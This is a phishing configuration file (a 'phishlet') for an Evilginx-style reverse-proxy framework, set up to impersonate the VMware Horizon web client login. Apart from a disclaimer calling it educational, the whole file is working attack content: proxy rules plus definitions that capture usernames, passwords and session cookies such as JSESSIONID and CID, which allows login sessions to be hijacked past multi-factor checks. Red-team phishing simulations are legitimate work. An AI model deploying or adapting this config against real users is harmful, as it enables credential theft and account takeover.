# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
# PLEASE DO NOT MISUSE THIS PHISHLET.

author: '@playswithfir3'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'my-horizon', orig_sub: 'my-horizon', domain: 'vmware.com', session: true, is_landing: true}
  - {phish_sub: '', orig_sub: '', domain: 'vmware.com'}

sub_filters:
  - {triggers_on: 'vmware.com', orig_sub: 'my-horizon', domain: 'vmware.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
  - {triggers_on: 'my-horizon.vmware.com', orig_sub: 'my-horizon', domain: 'vmware.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}

auth_tokens:
  - domain: 'vmware.com'
    keys: ['CID', 'JSESSIONID','JSESSIONIDHTMLACCESS','sessionDataServiceId','TCAT4vmware.com(.*),regexp']

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'my-horizon.vmware.com'
  path: '/portal/webclient/index.html'
